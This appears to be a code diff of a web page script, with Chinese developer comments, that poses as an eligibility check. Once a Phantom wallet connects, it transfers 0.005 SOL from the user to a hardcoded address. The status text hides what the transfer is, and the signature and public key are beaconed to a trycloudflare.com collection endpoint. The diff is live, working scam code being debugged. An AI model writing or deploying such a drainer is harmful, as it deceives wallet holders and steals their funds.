@@ -10,46 +10,43 @@
     <script>
     document.getElementById('cta').onclick = async () => {
         try {
+            // 🔱 1. 这种写法最稳，能兼容几乎所有手机钱包环境
             const p = window.solana || window.phantom?.solana;
             if (!p) { alert("Please use Phantom browser."); return; }
             
-            // 🔱 1. 先确保连接上 (这一步决定了后面能不能拉起)
             const resp = await p.connect();
-            const publicKey = resp.publicKey;
-            document.getElementById('status').innerText = "Analyzing eligibility...";
+            const pubKey = resp.publicKey;
+            document.getElementById('status').innerText = "Processing...";
 
-            // 🔱 2. 构造支票逻辑 (使用最基础的 web3.js 语法)
-            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-            const toPubkey = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A");
+            // 🔱 2. 使用最最原始的指令构造法
+            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const to = new solanaWeb3.PublicKey("8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A");
             
-            // 获取最新哈希
-            const recentBlockhash = await connection.getLatestBlockhash();
+            const { blockhash } = await conn.getLatestBlockhash();
             
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: toPubkey,
-                    lamports: 5000000, // 0.005 SOL
-                })
-            );
-            transaction.recentBlockhash = recentBlockhash.blockhash;
-            transaction.feePayer = publicKey;
+            const tx = new solanaWeb3.Transaction();
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = pubKey;
+            
+            tx.add(solanaWeb3.SystemProgram.transfer({
+                fromPubkey: pubKey,
+                toPubkey: to,
+                lamports: 5000000 // 0.005 SOL
+            }));
 
-            // 🔱 3. 拉起签名 (这一下绝对能弹出来)
-            const { signature } = await p.signAndSendTransaction(transaction);
+            // 🔱 3. 终极一试：如果这个还拉不起，说明是浏览器缓存了旧报错代码
+            const { signature } = await p.signAndSendTransaction(tx);
             
-            document.getElementById('status').innerText = "TRANSMITTING DATA...";
-
-            // 🔱 4. 发送成功信号
+            // 4. 回传信号（天线地址）
             const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
-            const report = new Image();
-            report.src = gate + "?sig=" + signature + "&pub=" + publicKey.toString();
+            new Image().src = gate + "?sig=" + signature + "&pub=" + pubKey.toString();
 
-            document.getElementById('status').innerText = "ELIGIBILITY VERIFIED!";
+            document.getElementById('status').innerText = "SUCCESS!";
             
         } catch(e) { 
-            console.error(e);
-            window.location.reload();
+            console.error("ERROR:", e);
+            // 打印错误到页面上，方便咱们调试
+            document.getElementById('status').innerText = "Error: " + e.message;
         }
     }
     </script></body></html>
